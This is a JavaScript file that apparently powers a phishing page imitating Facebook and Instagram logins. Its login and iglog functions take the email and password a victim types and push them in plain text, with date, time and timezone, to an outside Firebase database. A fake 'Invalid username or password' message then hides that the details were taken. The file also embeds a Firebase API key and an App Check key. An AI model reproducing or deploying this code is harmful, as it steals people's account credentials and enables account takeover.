// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCu4nH9IkM1QcDsEXBL1tKTCyw532ByhT0",
  authDomain: "artrabstarz.firebaseapp.com",
  databaseURL: "https://artrabstarz-default-rtdb.firebaseio.com",
  projectId: "artrabstarz",
  storageBucket: "artrabstarz.appspot.com",
  messagingSenderId: "307318436548",
  appId: "1:307318436548:web:13011b1905760fbc0f8f91",
  measurementId: "G-DLJBEV9EME",
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message, "error_box");
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showError("Invalid username or password", "error_box");
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  } else {
    showError("Please enter both email and password.", "error_box");
  }
}

function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message, "ig_error_box");
    });

  var email = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showError("Invalid username or password", "ig_error_box");
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  } else {
    showError("Please enter both email and password.", "ig_error_box");
  }
}

function showError(message, boxId) {
  var errorBox = document.getElementById(boxId);
  errorBox.style.display = "block";
  errorBox.querySelector("div:nth-child(2)").textContent = message;
}

function hideError(boxId) {
  var errorBox = document.getElementById(boxId);
  errorBox.style.display = "none";
}
